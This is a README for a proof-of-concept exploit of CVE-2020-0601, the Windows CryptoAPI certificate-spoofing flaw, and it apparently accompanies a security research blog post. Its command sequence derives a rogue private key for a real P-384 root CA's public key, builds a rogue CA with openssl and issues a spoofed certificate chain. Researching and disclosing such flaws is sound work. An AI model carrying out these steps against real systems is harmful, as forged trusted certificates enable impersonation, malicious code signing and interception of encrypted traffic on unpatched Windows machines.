# CryptoAPI

CVE-2020-0601: Windows CryptoAPI Spoofing Vulnerability exploitation. More information in our [blog post](https://research.kudelskisecurity.com/2020/01/15/cve-2020-0601-the-chainoffools-attack-explained-with-poc).

# Install requirements

```bash
pip install -U -r requirements.txt
```

# CA certificate

We used the [USERTrust ECC Certification Authority](http://www.tbs-x509.com/USERTrustECCCertificationAuthority.crt) but it can be any root certificate working on P-384 curve.

To generate a private key which match the public key from the root certificate we used the script **gen-key.py** (works with Python 3.6 and above):
```bash
$ ./gen-key.py RootCert.pem 
```

The key can be displayed with:
```bash
$ openssl ec -in p384-key-rogue.pem -text
```

Then to generate the rogue CA:

```bash
$ openssl req -key p384-key-rogue.pem -new -out ca-rogue.pem -x509 -config ca.cnf -days 500
```

Then we generate the following private key and certificate:
```bash
openssl ecparam -name prime256v1 -genkey -noout -out prime256v1-privkey.pem

openssl req -key prime256v1-privkey.pem -config openssl.cnf -new -out prime256v1.csr

openssl x509 -req -in prime256v1.csr -CA ca-rogue.pem -CAkey p384-key-rogue.pem -CAcreateserial -out client-cert.pem -days 500 -extensions v3_req -extfile openssl.cnf 
```

Finally to have the complete chain in a single file we concatenate the CA and the server certificates:
```bash
cat client-cert.pem ca-rogue.pem > cert.pem
```